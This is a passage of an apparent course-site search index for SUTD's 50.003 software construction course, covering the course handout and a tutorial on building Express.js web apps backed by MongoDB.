promise2.then(foo(data));\n  });\n});\n\nev2.on(\"run\", (data) =&gt; {\n  setImmediate(() =&gt; {\n    console.log(`data ${data} received by ev2`);\n    promise1.then(foo(data));\n  });\n});\n\nev2.emit(\"run\", count);\n</code></pre>"},{"location":"notes/l1_course_handout/","title":"50.003 Elements of Software Construction Course Handout","text":""},{"location":"notes/l1_course_handout/#this-page-will-be-updated-regularly-sync-up-often","title":"This page will be updated regularly. Sync up often.","text":""},{"location":"notes/l1_course_handout/#course-description","title":"Course Description","text":"<p>This course is an introduction to the fundamental principles and techniques of software construction that have the greatest impact on practice. Topics include capturing the essence of a problem by recognizing and inventing suitable abstractions; key paradigms, including basic concepts of software design and their expression using notations from Unified Modeling Language (UML); software testing, automated software test generation, automated software security testing via black box, greybox and whitebox fuzzing approaches, detection and removal of software code smells, software coding standards to avoid security loopholes, concurrent programming, including programming with threads and processes, understanding concurrency problems like deadlock and data race. This course includes exercises in software design, implementation, testing and reasoning.</p>"},{"location":"notes/l1_course_handout/#prerequisites","title":"Prerequisites","text":"<p>50.001 Information Systems &amp; Programming</p>"},{"location":"notes/l1_course_handout/#module-learning-outcomes","title":"Module Learning Outcomes","text":"<p>By the end of this module, students are able to</p> <p>Design medium-scale software systems from scratch: formulating and analysing the problem to be solved; writing formal software requirements, exploring and formulating system designs; and using extensive and systematic testing and reasoning to ensure quality.</p> <ol> <li>Apply key software engineering ideas, including invariants, decoupling, and data abstraction.</li> <li>Apply key software engineering ideas, including software design, specification, abstraction, verification and correctness.</li> <li>Apply widely used design concepts and notations (UML diagrams) and patterns in exploring and articulating problems and designs.</li> <li>Learning effective techniques on ensuring quality of large-scale software systems.</li> <li>Apply concepts of systematic software testing to discover bugs (including security vulnerabilities) in large-scale software systems.</li> <li>Apply concepts to reason about the security loopholes in software systems.</li> <li>Learning secure software coding standards.</li> <li>Learning key concepts in developing concurrent programs.</li> <li>Learning key concepts in reasoning and testing concurrent programs.</li> </ol>"},{"location":"notes/l1_course_handout/#resource","title":"Resource","text":"<p>The main resources are lecture slides, tutorial sessions, and online documentations. There are no official textbooks. But the following are useful for reference and deeper understanding of some topics.</p> <ul> <li>Martina Seidl, Marion Scholz, Christian Huemer and Gerti Kappel, UML @ Classroom: An Introduction to Object-Oriented Modeling, 2015</li> <li>Martin Fowler, UML Distilled, 3<sup>rd</sup> Edition, 2003.</li> <li>Brian Goetz et al., Java Concurrency in Practice, 1<sup>st</sup> Edition. Boston, MA: Addison-Wesley, 2006.</li> <li>Paul C. Jorgense, Software Testing: A Craftsman's Approach, 4<sup>th</sup> Edition. 2013.</li> </ul>"},{"location":"notes/l1_course_handout/#instructors","title":"Instructors","text":"<ul> <li> <p>Prof Kenny Lu (kenny_lu@sutd.edu.sg)   Office Hour: Wednesday 3:00-4:30pm (please send email to arrange)</p> </li> <li> <p>Prof Dileepa Fernando (dileepa_fernando@sutd.edu.sg)   Office Hour:</p> </li> </ul>"},{"location":"notes/l1_course_handout/#tas","title":"TAs","text":"<ul> <li>Cai Junjie junjie_cai@mymail.sutd.edu.sg</li> <li>Hengchang Qi hengchang_qi@mymail.sutd.edu.sg</li> <li>Ho Xiaoyang  xiaoyang_ho@mymail.sutd.edu.sg</li> </ul>"},{"location":"notes/l1_course_handout/#gta","title":"GTA","text":"<ul> <li>Mohamed Meeran Sheik Abdul Kader mohamed_meeran@sutd.edu.sg</li> </ul>"},{"location":"notes/l1_course_handout/#communication","title":"Communication","text":"<p>If you have course/assignment/project related questions, please post it on the dedicated MS teams channel.</p>"},{"location":"notes/l1_course_handout/#grading","title":"Grading","text":"<p>Your final grade is computed as follows:</p> <ul> <li>Cohort exercises \u2013 18%</li> <li>Course Feedback \u2013 2%</li> <li>Quizzes \u2013 10%</li> <li>Course Project \u2013 40%<ul> <li>Project Meetings 1, 2, 3 (each 5%)</li> <li>Final presentation, demo, report and peer review (25%)</li> </ul> </li> <li>Final Exam \u2013 30%</li> </ul>"},{"location":"notes/l1_course_handout/#things-you-need-to-prepare","title":"Things you need to prepare","text":"<ul> <li>Git</li> <li>Node.js (version &gt; 20)</li> <li>Visual Studio Code (or whatever IDE you prefer)</li> <li>Ubuntu subsystem if you are using Windows</li> <li>MongoDB</li> <li>MySQL &gt;8</li> </ul>"},{"location":"notes/l1_course_handout/#project","title":"Project","text":"<p>Please refer to the project page.</p>"},{"location":"notes/l1_course_handout/#submission-policy-and-plagiarism","title":"Submission Policy and Plagiarism","text":"<ol> <li>You will do the assignment/project on your own (own teams) and will not copy paste solutions from someone else.</li> <li>You will not post any solutions related to this course to a private/public repository that is accessible by the public/others.</li> <li>Students are allowed to have a private repository for their assignment which no one can access.</li> <li>For projects, students can only invite their partners as collaborators to a private repository.</li> <li>The parts of the deliverables not created / produced by the students must be declared by providing the source of references, e.g. the code is adopted from stackoverflow / LLM and modified by the students. </li> <li>Failing to follow the Code of Honour will result in failing the course and/or being submitted to the University Disciplinary Committee. The consequences apply to both the person who shares their work and the person who copies the work.</li> </ol>"},{"location":"notes/l1_course_handout/#schedule-18-may-2025-24-aug-2025","title":"Schedule (18 May 2025 - 24 Aug 2025)","text":"Week Lecture 1 Lecture 2 Cohort Class Remarks 1 (19/5) 1 Course Briefing, 2. Basics of Web Programming and JavaScript NodeJS and Asynchronous Callbacks Cohort Exercise 1 Project Team Submission (25/5 23:59) 2 (26/5) Web App Backend Architecture Web App Backend Architecture (Relational Database) Cohort Exercise 2 CE 1 Submission (26/5 23:59) 3 (2/6) Quiz 1: Node.js (3%)  Web App Frontend Architecture Web App Frontend Architecture Cohort Exercise 3 CE 2 Submission (9/6 23:59) 4 (9/6) Introduction to Software Engineering Software Modelling UML UML Use Cases and Use Case Descriptions Cohort Exercise 4 CE 3 Submission (16/6 23:59) 5 (16/6) Domain Modelling and UML Class Diagrams UML Sequence Diagrams 1 Cohort Exercise 5 CE4 Submission 6 (23/6) Quiz 2:UML (3%)UML Sequence Diagram 2 UML\u2013 Solution Class Diagram Software Architecture Project Meeting 1 CE5 Submission 7 (30/6) Recess Week Recess Week 8 (7/7) 1. Software Testing  2. Slide 8b Guest Lecture (Software Deployment) Cohort Exercise 6 1. Submit project meeting 2 presentation video by 13/7 2359 9 (14/7) 1. Blackbox unit testing  2.  Slide 9a 1. Blackbox integration / system testing  2. Slide 9b Project Meeting 2 CE6 Submission 10 (21/7) 1. UI Testing  2. Slide 10a  3. Code 1. Whitebox / Path base testing  2. Slide 10b Blackbox Testing Submit project meeting 3 presentation video by 21/7 2359  11 (28/7) Quiz 3: Unit Testing (4%) Test generation: Fuzzing Test generation: Genetic algorithm, Symbolic Execution Project Meeting 3 12 (4/8) Concurrency and Concurrent Testing Secure Software Coding Standard, Code smells and Maintenance Guest Lecture Part 2 Project Consultation CE 10 submission 2/8/24 23:59 13 (11/8) Final Presentation Final Presentation Final Presentation 14 (18/8) Final Exam"},{"location":"notes/l1_course_handout/#make-up-and-alternative-assessment","title":"Make Up and Alternative Assessment","text":"<p>Make ups for Final exam will be administered when there is an official Leave of Absence from OSA. There will be only one make up. There will be no make-up if students miss the make up test.</p>"},{"location":"notes/l2_1_expressjs_backend_mongo/","title":"50.003 - Express.js and Mongo DB","text":""},{"location":"notes/l2_1_expressjs_backend_mongo/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit, you should be able to</p> <ol> <li>Develop a simple web restful API using node.js and express.js</li> <li>Use MongoDB to manage a document database</li> <li>Integrate the restful API with MongoDB as the database.</li> <li>Articulate the design processes of a database.</li> </ol>"},{"location":"notes/l2_1_expressjs_backend_mongo/#web-application","title":"Web Application","text":"<p>A web application is a program that runs mainly on the server (not on the browser), which listens to requests from clients (such as browser, mobile app and etc). These requests are often conveyed using the hyper text transfer protocol (HTTP) or its secured variant (HTTPS). Given a request, the web application returns the correspondent response to the client. We can think of a web application takes a HTTP(s) request as input and returns a HTTP(s) response as result if the request is valid, returns an error response otherwise.</p> <p>A simple web application can be defined using the builtin <code>http</code> module in Node.js.</p> <p>Suppose we have a following Node.js script <code>simple_webapp.js</code></p> <pre><code>// import http from 'http' // won't work, not in a npm project\nconst http = require(\"http\");\n\nconst webAppServer = http.createServer((req, res) =&gt; {\n  if (req.url === \"/\") {\n    res.write(`\n        &lt;html&gt;\n            &lt;head&gt;&lt;title&gt;Welcome&lt;/title&gt;&lt;/head&gt;\n            &lt;body&gt;Welcome to 50.003!&lt;/body&gt;\n        &lt;/html&gt;`);\n    res.end();\n  } else {\n    res.write(`\n        &lt;html&gt;\n            &lt;head&gt;&lt;title&gt;Error&lt;/title&gt;&lt;/head&gt;\n            &lt;body&gt;Page not found&lt;/body&gt;\n        &lt;/html&gt;`);\n    res.end();\n  }\n});\n\nwebAppServer.listen(3000);\n</code></pre> <p>In the program, we instantiate an http server object <code>webAppServer</code> by calling the constructor method <code>http.createServer()</code>, which takes an executor function as the argument. The executor function expects a request and a response as inputs and writes output (HTML) to the reponse. In the last statement, we start the web app server by calling <code>.listen(3000)</code>, i.e. the server is running on port 3000.</p> <p>We can start the web app by running <code>node simple_webapp</code>. Open <code>http://127.0.0.1:3000/</code> in a browser. It will display the welcome page.</p> <p>Recall that from our previous lesson, Node.js executes the given JavaScript program statement by statement until there is nothing left in the call stack, then it continues with the event loop. The event loop will check for timer functions (which is absent in the above), check the micro and macro task queues, poll the I/O, and etc. Until there is nothing pending callback or I/O. One may ask how comes our simple_webapp program remains running? The answer lies in the last statement, the <code>.listen()</code> method keeps the web server in the event-loop by having an active handler waiting for HTTP request event.</p> <p>One issue with the above implementation is that all the request to response mapping are defined in a single function and there is only one iteration. In real world projects, we need to decompose the web app into multiple modules and components to handle different functionalities, e.g. sigup/login, user profile, content access, payment and etc. Furthermore, there are some common operations which are to be performed in nearly all requests, e.g. checking whether the user has already login. Lastly, the formatting of the return response, i.e. HTML code, CSS and client side JavaScripts should be modularized and built up systematically. With these consideration in mind, we often prefer using some web application framework to guide the development instead of building everything from scratch for productivity concern.</p>"},{"location":"notes/l2_1_expressjs_backend_mongo/#expressjs","title":"Express.js","text":"<p>Express.js is one of the popular web application framework for Node.js.</p> <p>To use express.js</p> <pre><code>mkdir my_express_app\ncd my_express_app\nnpm init\nnpm i express\n</code></pre> <p>Then we add a file <code>app.js</code> with the following content</p> <pre><code>const express = require(\"express\");\nconst app = express();\nconst port = 3000;\n\napp.get(\"/\", (req, res) =&gt; {\n  res.send(\"Hello World!\");\n});\n\napp.listen(port, () =&gt; {\n  console.log(`Example app listening on port ${port}`);\n});\n</code></pre> <p>At this stage, we have a web application created using express.js. It allows us to seperate the different request url path into different cases, <code>app.get()</code> handlers.</p> <pre><code>app.get(\"/login\", (req, res) =&gt; {\n  res.send(`Under construction!`);\n});\n</code></pre> <p>To start the web server, run</p> <pre><code>node app.js\n</code></pre>"},{"location":"notes/l2_1_expressjs_backend_mongo/#to-make-the-express-app-es6-compatible-optional","title":"To make the express app ES6 compatible (optional)","text":"<p>By default, Express.js does not support ES6. To make it ES6 compatible, we</p> <ol> <li>add the following to <code>package.json</code></li> </ol> <pre><code>  \"type\" : \"module\",\n</code></pre> <ol> <li>Rename <code>bin/www</code> to <code>bin/www.js</code>.</li> <li>Rewrite <code>const xyz = require('./some/package')</code> into <code>import xyz from './some/package'</code> in all the <code>.js</code> files.</li> <li>Rewrite <code>modules.export = xyz</code> into <code>export default xyz</code>.</li> <li>Enable Babel, refer</li> </ol> <pre><code>https://dev.to/geekygeeky/get-started-with-es6-javascript-for-writing-nodejs-using-express-544h\n</code></pre> <p>For the rest of this unit we stick to CommonJS syntax.</p>"},{"location":"notes/l2_1_expressjs_backend_mongo/#expressjs-generator","title":"Express.js Generator","text":"<p>In many cases, we may use the express generator to generate a proper project structure. First we recreate another project folder</p> <pre><code>cd ..\nmkdir my_eg_app\ncd my_eg_app\nnpx express-generator --view=ejs\n</code></pre> <p>The <code>--view=ejs</code> flag sets <code>ejs</code> as the view template engine (remember <code>jinja2</code>?). The default view template is <code>Jade</code>. Executing the above gives us a project folder with the following structure.</p> <pre><code>.\n\u251c\u2500\u2500 app.js\n\u251c\u2500\u2500 bin\n\u2502   \u2514\u2500\u2500 www\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 public\n\u2502   \u251c\u2500\u2500 images\n\u2502   \u251c\u2500\u2500 javascripts\n\u2502   \u2514\u2500\u2500 stylesheets\n\u2502       \u2514\u2500\u2500 style.css\n\u251c\u2500\u2500 routes\n\u2502   \u251c\u2500\u2500 index.js\n\u2502   \u2514\u2500\u2500 users.js\n\u2514\u2500\u2500 views\n    \u251c\u2500\u2500 error.ejs\n    \u2514\u2500\u2500 index.ejs\n</code></pre> <p>where <code>app.js</code> is the main entry script. <code>bin</code> stores dependency scripts such as <code>www</code>, <code>package.json</code> is the project file, <code>public</code> stores the static files to be delivered to the client, <code>route</code> contains the different sub-module routing rules, <code>views</code> store the view template sub modules.</p> <p>Let's run <code>npm i</code> to download all the dependencies defined in <code>package.json</code>.</p> <p>When it is done, run <code>npm start</code>, we observe the following in the command prompt</p> <pre><code>&gt; my-eg-app@0.0.0 start\n&gt; node ./bin/www\n</code></pre> <p>Opening <code>https://127.0.0.1:3000</code> in the browser, we should see a page with a <code>Welcome to Express</code> message.</p>"},{"location":"notes/l2_1_expressjs_backend_mongo/#mvc-architecture","title":"MVC architecture","text":"<p>Express.js adopts Model View Controller architecture. </p> <p>MVC groups packages and modules based on their roles and functionalities.</p> <ol> <li>Models. The model packages define the data being stored in the storage systems such as the databases, and abstract away the operations for data manipulation.</li> <li>View. The view packages define representation and format of the requested data being returned to the client.</li> <li>Controller. The controller packages define rules and routes of how user can request for and operate over the content and data.</li> </ol> <p>To illustrate, let's look at a simple example.</p>"},{"location":"notes/l2_1_expressjs_backend_mongo/#an-echoer","title":"An Echoer","text":"<p>Let's build an echoer web app, which listens to the user's request and returns the same.</p> <p>First we need to add a new routing rules to the controller. In the <code>routes</code> folder add a new file named <code>echo.js</code> with the following content.</p> <pre><code>const express = require(\"express\");\nvar router = express.Router();\n\n/* GET echo listing. */\nrouter.get(\"/:msg\", function (req, res, next) {\n  const msg = req.params.msg;\n  res.send(`${msg}`);\n});\n\nmodule.exports = router;\n</code></pre> <p>In the above, we define a new router which listens to HTTP get requests with URL pattern <code>/:msg</code> where <code>:msg</code> is the request parameter and returns a response containing the <code>msg</code> itself. In other words, anything after the <code>/</code> in URL is read as a String parameter stored in variable <code>msg</code>.</p> <p>Back in the project root folder, we add the following to the <code>app.js</code></p> <pre><code>...\nvar indexRouter = require('./routes/index'); // generated by express generator\nvar usersRouter = require('./routes/users'); // generated by express generator\nvar echoRouter = require('./routes/echo');   // added by us\nvar app = express(); // generated by express generator\n\n// view engine setup\n...\napp.use('/', indexRouter); // generated by express generator\napp.use('/users', usersRouter); // generated by express generator\napp.use('/echo', echoRouter);   // added by us\n</code></pre> <p>This allows us to \"link up\" the newly defined <code>echo.js</code> router with the web app. More specifically, we would like the web app to listen to the HTTP get requests with URL prefix <code>/echo</code> and pass it over to the echo router. Note that there are already two existing routers generated by the express generator.</p> <p>Now restart the web express app by pressing control-C in the command prompt and re-run <code>npm start</code>.</p> <p>Open the URL <code>https://127.0.0.1:3000/echo/hello</code> will render the message <code>hello</code> in the browser.</p> <p>Behind the scene, the following events took place.</p> <ol> <li>The web browser (client) sends a HTTP get request <code>https://127.0.0.1:3000/echo/hello</code> to the server, located at 127.0.0.1:3000.</li> <li>The express.js app (server) receives the requests (actually it is managed by the controller), and finds that the URL path is <code>/echo/hello</code>, it forwards the subfix <code>/hello</code> to the <code>echoRouter</code>.</li> <li>The <code>echoRouter</code> process the requests by extracting the <code>:msg</code>, i.e. <code>msg = \"hello\"</code>, and returns a response with <code>hello</code> as the content.</li> <li>The web browser (client) receives the HTTP response with message <code>hello</code> and renders it.</li> </ol> <p>Note that in the above example, there is no business logic involved and there is no data retrieved / updated in the persitent storage.</p> <p>Let's consider adding some few features to our web app.</p> <p>Suppose we would like to keep track of the messages being processed by the echoer, we need to add a model (a database entity) to handle how the data is stored and retrieved.</p>"},{"location":"notes/l2_1_expressjs_backend_mongo/#mongo-db","title":"Mongo DB","text":"<p>There are multiple choices of databases which affects the choice of model framework. Few of them are:</p> <p>Relational Database. Data are stored as records in tables. Data queries are performed by joining data from multiple tables.</p> <ul> <li>Pros: Very concise and strict design. Close resemblance of domain models, class diagram. Data update are guaranteed to be consistent immediately. Data redundancy is eliminated. Concurrency is handled by the database system.</li> <li>Cons: Difficult to design, Difficult to be distributed. Join operations may be expensive.</li> </ul> <p>Document Database. Data are stored as documents. Data queries are performed by traversing between documents and references.</p> <ul> <li>Pros: A natural representation of human's perception of how data are stored. Easy to distribute the data into multiple servers. Queries operation could be faster.</li> <li>Cons: Data update are not consistent immediately. It could lead to poor design with many data redundancy. Some level of concurrency is handled by the database system.</li> </ul> <p>In this unit, we consider using a document database, MongoDB.</p> <p>Let's install mongodb. Follow this guide.</p> <pre><code>https://www.mongodb.com/docs/manual/administration/install-community/\n</code></pre> <p>After the installation, run the following to start the mongo database server</p> <ul> <li>For Ubuntu (or Ubuntu subsystem user), <code>systemctl services start mongod</code></li> <li>For Mac OS, <code>brew services start mongodb-community</code></li> </ul>"},{"location":"notes/l2_1_expressjs_backend_mongo/#accessing-mongodb-via-mongo-shell","title":"Accessing MongoDB via Mongo Shell","text":"<p>To launch a mongoDB client, (which is called the mongo shell)</p> <pre><code>mongosh\ntest&gt; show dbs;\nadmin   40.00 KiB\nconfig  60.00 KiB\nlocal   72.00 KiB\n</code></pre> <p>MongoDB is a database management system, it contains and manages multiple databases.</p> <p>To change to a partcular database (if not exists, create it), we type</p> <pre><code>test&gt; use echo;\n</code></pre> <p>A database contains multiple collections. We can think of a collection is a collection of documents. To check the list of collections in the database <code>echo</code>.</p> <pre><code>echo&gt; show collections;\n</code></pre> <p>Obviously there is no collection in database <code>echo</code> when you run it the first time.</p> <p>Let's create a collection.</p> <pre><code>echo&gt; db.createCollection('message');\n</code></pre> <p>Now we have a database named <code>echo</code> which has a collection name <code>message</code>. You can run the <code>show collections</code> again to check.</p> <p>Now, let's insert some documents into the collection.</p> <pre><code>echo&gt; db.message.insertOne({ 'key': 1, 'msg':'hello', 'time':new Date() });\n\necho&gt; db.message.insertOne({ 'key': 2, 'msg':'hello', 'time':new Date() });\n</code></pre> <p>You can see the documents in the collection by</p> <pre><code>echo&gt; db.message.find();\n</code></pre> <p>In the above example, we created two documents, with an integer <code>key</code>, a string <code>msg</code> and a date type attribute <code>time</code>. Note that for every document being inserted, MongoDB automatically adds an extra attribute <code>_id</code> which is a unique identifier for that doucment.</p> <p>For the full list of data type of MongoDB, refer to</p> <pre><code>https://www.mongodb.com/docs/mongodb-shell/reference/data-types/\n</code></pre> <p>Next we consider how to retrieve some documents based on some criteria.</p> <pre><code>echo&gt; db.message.findOne({ 'key' : { $eq : 1 }})\n\n// Output:\n{\n  _id: ObjectId('665552798e912adcf1b90346'),\n  key: 1,\n  msg: 'hello',\n  time: ISODate('2024-05-28T03:41:45.271Z')\n}\n</code></pre> <p>The above query returns a single document that having <code>key</code> equals to <code>1</code>.</p> <p>We could also use <code>$lt</code> and <code>$gt</code> to define range queries.</p> <pre><code>echo&gt; db.message.findOne({ 'key' : { $gt : 1 } })\n\n{\n  _id: ObjectId('6656f1e78e912adcf1b90347'),\n  key: 2,\n  msg: 'hello',\n  time: ISODate('2024-05-29T09:14:15.691Z')\n}\n</code></pre> <p>Note that <code>findOne</code> returns the one document, in case of a query that matches with multiple documents, we should use <code>find</code></p> <pre><code>echo&gt; db.message.find({ 'key' : { $gt : 0 }})\n\n[\n  {\n    _id: ObjectId('665552798e912adcf1b90346'),\n    key: 1,\n    msg: 'hello',\n    time: ISODate('2024-05-28T03:41:45.271Z')\n  },\n  {\n    _id: ObjectId('6656f1e78e912adcf1b90347'),\n    key: 2,\n    msg: 'hello',\n    time: ISODate('2024-05-29T09:14:15.691Z')\n  }\n]\n</code></pre> <p>To define a conjunctive query, we can either implicitly including multiple constraint in the same query</p> <pre><code>db.message.find( { 'key' : {$gt:1}, 'time': {$gt:new Date(\"2023-05-23T08:08:26.255Z\")}})\n</code></pre> <ol> <li>explicitly using <code>$and</code></li> </ol> <pre><code>db.message.find({ $and : [ {'key' : { $gt : 1 }}, {'time' : { $gt : new Date(\"2023-05-23T08:08:26.255Z\")}}]})\n</code></pre> <p>Both yield</p> <pre><code>[\n  {\n    _id: ObjectId('6656f1e78e912adcf1b90347'),\n    key: 2,\n    msg: 'hello',\n    time: ISODate('2024-05-29T09:14:15.691Z')\n  }\n]\n</code></pre> <p>Similar to <code>$and</code>, we can use <code>$or</code> to define disjunctive query.</p> <pre><code>echo&gt; db.message.find({ $or : [ {'key' : { $gt : 0 }}, {'time' : { $eq : new Date(\"2023-05-23T08:08:26.255Z\")}}]})\n\n\n[\n  {\n    _id: ObjectId('665552798e912adcf1b90346'),\n    key: 1,\n    msg: 'hello',\n    time: ISODate('2024-05-28T03:41:45.271Z')\n  },\n  {\n    _id: ObjectId('6656f1e78e912adcf1b90347'),\n    key: 2,\n    msg: 'hello',\n    time: ISODate('2024-05-29T09:14:15.691Z')\n  }\n]\n</code></pre> <p>We may also query documents of nested documents.</p> <pre><code>echo&gt; db.createCollection('user');\n{ ok: 1 }\n\necho&gt; db.user.insertOne({ 'id':1, 'name':'bob', 'dob': { 'year': 2001, 'month':12, 'day':25 } });\n{\n  acknowledged: true,\n  insertedId: ObjectId(\"6476a12efb9207a944895017\")\n}\n\necho&gt; db.user.find( { 'dob.year' : { $eq : 2001 }  }  )\n[\n  {\n    _id: ObjectId(\"6476a12efb9207a944895017\"),\n    id: 1,\n    name: 'bob',\n    dob: { year: 2001, month: 12, day: 25 }\n  }\n]\n</code></pre> <p>Note that the <code>find</code> method returns a list of documents, we may use a cursor variable to iterate through the document list.</p> <pre><code>echo&gt; var cursor = db.message.find();\necho&gt; while (cursor.hasNext()) { printjson(cursor.next()); }\n\n{\n  _id: ObjectId('665552798e912adcf1b90346'),\n  key: 1,\n  msg: 'hello',\n  time: ISODate('2024-05-28T03:41:45.271Z')\n}\n{\n  _id: ObjectId('6656f1e78e912adcf1b90347'),\n  key: 2,\n  msg: 'hello',\n  time: ISODate('2024-05-29T09:14:15.691Z')\n}\n</code></pre> <p>In the above, we call <code>.find()</code> to execute the query, the result list of documents is assigned to a <code>cursor</code> variable. The <code>cursor</code> in this context behaves similar to an iterator found in Python and Java, i.e. we can use <code>.hasNext()</code> to check whether it has the next element, <code>.next()</code> to retrieve the next element incrementally. This allows us to scan through the set of results (which is potentially huge and not fitting in the RAM).</p> <p>To delete a set of documents meeting the criteria, we use the <code>deleteMany</code> method.</p> <pre><code>db.message.deleteMany({ 'key': { $eq: 2}})\n</code></pre> <p>For the full list of collection operations refer to</p> <pre><code>https://www.mongodb.com/docs/manual/crud/\n</code></pre> <p>and</p> <pre><code>https://www.mongodb.com/docs/manual/aggregation/\n</code></pre>"},{"location":"notes/l2_1_expressjs_backend_mongo/#mongodb-as-a-db-in-an-expressjs-app","title":"MongoDB as a DB in an Express.js app","text":"<p>Firstly, let's create a new project.</p> <pre><code>mkdir my_mongo_app\ncd my_mongo_app\nnpx express-generator --view=ejs\nnpm i mongodb\nnpm audit fix --force\n</code></pre> <p>We should have a project whose structure is similar to the previous echo app. Copy the <code>app.js</code> and <code>echo.js</code> files from the last app over into the current app.</p> <p>Next we create a folder <code>models</code> under the project root folder. In the <code>models</code> folder, we create a file named <code>db.js</code> with the following content.</p> <pre><code>const MongoClient = require(\"mongodb\").MongoClient;\n// creating a user with a password to mongodb is recommended.\nconst connection_str = \"mongodb://localhost:27017/\";\nconst client = new MongoClient(connection_str);\nconst dbName = \"echo\";\n\nvar db = null;\n\ntry {\n  db = client.db(dbName);\n} catch (error) {\n  console.error(\"database connection failed. \" + error);\n}\n\nasync function cleanup() {\n  await client.disconnect();\n}\n\nmodule.exports = { db, cleanup };\n</code></pre> <p>In the above we initialize the connection string and establish a mongodb client connection. In addition, we define a <code>cleanup()</code> function which will be callled when the web app terminates.</p> <p>Then we modify the <code>app.js</code> by importing the <code>./models/db.js</code> module, and the <code>process</code> module.</p> <pre><code>const process = require(\"process\");\nvar db = require(\"./models/db.js\");\nprocess.on(\"SIGINT\", db.cleanup);\nprocess.on(\"SIGTERM\", db.cleanup);\n</code></pre> <p>We register the <code>SIGINT</code> (signal interupt) and the <code>SIGTERM</code> (signal terminate) events with the <code>cleanup()</code> function from the <code>db.js</code> module.</p> <p>Next we create a new file in the <code>./models/</code> folder with name <code>message.js</code> with the following content.</p> <pre><code>const db = require(\"./db.js\");\n\nconst collectionName = \"message\";\n\nclass Message {\n  constructor(msg, time) {\n    this.msg = msg;\n    this.time = time;\n  }\n}\n\n/** return all mesages */\nasync function all() {\n  try {\n    const collection = db.db.collection(collectionName);\n    const cursor = collection.find();\n    var messages = [];\n    while (await cursor.hasNext()) {\n      const dbobj = await cursor.next();\n      messages.push(new Message(dbobj.msg, dbobj.time));\n    }\n    return messages;\n  } catch (error) {\n    console.error(\"database connection failed.\" + error);\n    throw error;\n  }\n}\n\n/** insert a list of messages */\nasync function insertMany(messages) {\n  try {\n    const collection = db.db.collection(collectionName);\n    await collection.insertMany(messages);\n  } catch (error) {\n    console.error(\"database connection failed.\" + error);\n    throw error;\n  }\n}\n\nmodule.exports = { Message, all, insertMany };\n</code></pre> <p>In this module, we import the <code>db.js</code> module, we define a class <code>Message</code> with two attributes. In addition, we define a query function <code>all()</code> that retrieves all messages, and an <code>insertMany()</code> function that inserts new documents into the the collection. Note that these functions are <code>async</code> as the underlying calls to the db are asynchronous, i.e. producing promises.</p> <p>Finally, we modify the <code>echo.js</code> router to save the echoed message and retrieve all the old messages.</p> <pre><code>const echoModel = require(\"../models/message.js\");\nrouter.get(\"/:msg\", async function (req, res, next) {\n  const msg = req.params.msg;\n  const message = new echoModel.Message(msg, new Date());\n  await echoModel.insertMany([message]);\n  const messages = await echoModel.all();\n  res.send(`${JSON.stringify(messages)}`);\n});\n</code></pre>"},{"location":"notes/l2_1_expressjs_backend_mongo/#exercise-not-graded","title":"Exercise (Not Graded)","text":"<ol> <li>Modify the <code>echo</code> router so that it will return the most recent 3 messages?</li> <li>Add an end point <code>/echo/delete</code> to the <code>echo</code> router to delete the oldest message.</li> </ol>"},{"location":"notes/l2_1_expressjs_backend_mongo/#object-data-mapping","title":"Object Data Mapping","text":"<p>In the above example, we incorporate the model layer to the web app. The models abstract away the underlying database operations in forms of function calls and class object instantiation.</p> <p>Alternatively, we could use the <code>mongoose</code> library to help us to generate some of these codes. You are encouraged to check out the <code>mongoose</code> library.</p> <pre><code>https://mongoosejs.com/\n</code></pre>"},{"location":"notes/l2_1_expressjs_backend_mongo/#where-are-the-controllers","title":"Where are the controllers?","text":"<p>So far we have not seen any controller in this project. We will define controller when we need to model complex business logic which involves multiple models, which is absent in this example.</p>"},{"location":"notes/l2_1_expressjs_backend_mongo/#a-briefing-on-data-modelling","title":"A Briefing on Data Modelling","text":"<p>In Software engineering, we often use UML model to formalize the system requirements. In Database design, we often use Entity Relation (ER) diagrams to formalize the data requirements of a system. This phase is also known as conceptual modelling in which we focus in identifying what data to store, rather than how to store the data.</p> <p>An ER Diagram may consists of some of the following</p> <ol> <li>Entity set. An entity set captures a set of objects or items to be stored. It is represented as a rectangular box with the entity name inside.</li> <li>Attribute. An attribute describe a property of an entity. An attribute is represented as an oval shape with the attribute name inside. Attribute serves as (part of) the primary key of the entity will be underlined.</li> <li>Relationship. A relationship defines the relationship between entities. It is represented as a diamond shape with the relationship name inside. Relationships are often annotated with cardinality constraints. We will discuss it shortly.</li> </ol> <p>For instance</p> <p></p> <p>The above ER diagram, we find that <code>Staff</code> as an entity set. Each staff in this entity set should have two attributes, <code>Sid</code> and <code>Name</code>. <code>Sid</code> is the unique identifier for an entity object in a set.</p> <p>Let's consider another digram</p> <p></p> <p>In the above ER diagram, we find another entity set <code>Dept</code>, which is identified by the <code>Code</code> attribute. There exists a relationship between <code>Staff</code> and <code>Dept</code> entity sets, i.e. <code>Work</code>. It implies that the database system should store the information of which staff is working in which department. The <code>N</code> and <code>1</code> annotating the connectors are known as the cardinality of the relationship.</p> <ul> <li>The <code>1</code> indicates that for each entity object in <code>Staff</code> there exists maximum 1 corresponding entity object in <code>Dept</code>. In plain English it means, a staff can work in only 1 department in maximum.</li> <li>The <code>N</code> denotes the fact that for each entity object in <code>Dept</code> there exists (infiniely) many corresponding entity objects in <code>Staff</code>. In plain English it means, a department may have many staff working inside.</li> </ul> <p>Let's consider another diagram</p> <p></p> <p>In the above ER diagram, we find an additional relationship between the <code>Staff</code> and <code>Dept</code>, i.e. <code>Manage</code> which captures the fact that the database system should capture the information of the manager of each department.</p> <ul> <li>The <code>1</code> near the <code>Dept</code> means that each staff can only be the manager of maximum one department.</li> <li>The <code>1</code> next to the <code>Staff</code> means that each department has at most one manager.</li> </ul>"},{"location":"notes/l2_1_expressjs_backend_mongo/#er-to-document","title":"ER to Document","text":"<p>Mapping the ER diagram to MongoDB collection is to determine how the data should be stored. This phase is also known as logical modelling (and subsequently physical modelling).</p> <p>Let's consider the modelling the ER diagram with <code>Staff</code> and <code>Dept</code> and <code>Work</code> relationship (without the <code>Manage</code> relation).</p> <p>There are more than one possible logical models:</p> <p>Approach one: Storing <code>Dept</code> as a collection, which has attributes <code>code</code> and <code>staff</code>. <code>code</code> is a string, <code>staff</code> is a list of objects. Each object in <code>staff</code> is a document with <code>sid</code> and <code>name</code> as attributes. e.g.</p> <pre><code>{\n  \"code\": \"HR\",\n  \"staff\": [\n    {\n      \"id\": 1,\n      \"name\": \"aaron\"\n    },\n    {\n      \"id\": 2,\n      \"name\": \"betty\"\n    }\n  